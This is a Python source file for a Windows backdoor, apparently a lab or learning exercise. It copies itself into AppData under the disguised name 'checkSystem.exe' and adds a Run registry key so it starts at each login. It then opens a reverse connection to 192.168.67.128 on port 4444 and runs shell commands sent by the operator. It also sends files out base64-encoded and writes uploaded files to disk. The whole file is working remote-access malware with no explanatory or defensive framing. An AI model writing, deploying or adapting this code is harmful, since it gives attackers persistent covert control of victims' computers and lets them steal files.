import base64
import os
import socket
import subprocess
import json
import sys
import shutil
class BackDoor:
    def __init__(self, ip_address, port):
        self.make_persistance()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip_address, port))
        # self.connection.send(b"[+] Connection Successfully\n")

    def make_persistance(self):
        evil_path = os.environ["AppData"] + "\\checkSystem.exe"
        print(evil_path)
        if not os.path.exists(evil_path):
            shutil.copy(sys.executable, evil_path)
            subprocess.call(f'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v check_system /t REG_SZ /d "{evil_path}"')

    def reliability_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliability_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def system_command(self, command):
        try:
            command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
        except Exception as e:
            command_result = str(e)
        self.reliability_send(command_result)
        # return self.reliability_recv()

    def changing_directory_to(self, path):
        os.chdir(path)
        self.reliability_send(f"Changing directory to {path} current directory is {os.getcwd()}")

    def download_file(self, file_name):
        try:
            with open(file_name, "rb") as file:
                file_data_binary = file.read()
        except Exception as e:
            file_data_binary = str(e)
        self.reliability_send(base64.b64encode(file_data_binary).decode('utf-8')
                              )

    def uploading_file(self, file_name, data_base_64):
        binary_data = base64.b64decode(data_base_64)
        with open(file_name, "wb") as file:
            file.write(binary_data)
        self.reliability_send(f"[+]Downloaded Successfully")

    def run(self):
        while True:

            try:
                json_data = self.reliability_recv()
                # print(json_data)
                if json_data[0].lower() == "exit":
                    print("Closing The connection !!!!!")
                    self.connection.close()
                    sys.exit()
                elif json_data[0] == "cd" and len(json_data) > 1:
                    self.changing_directory_to(json_data[1])
                elif json_data[0].lower() == "download" and len(json_data) > 1:
                    self.download_file(json_data[1])
                elif json_data[0].lower() == "upload" and len(json_data) > 1:
                    self.uploading_file(json_data[1], json_data[2])
                else:
                    self.system_command(json_data)
            except Exception as e:
                json_data = str(e)
                self.reliability_send(json_data)


try:
    connection = BackDoor("192.168.67.128", 4444)
    connection.run()
except Exception as e:
    sys.exit()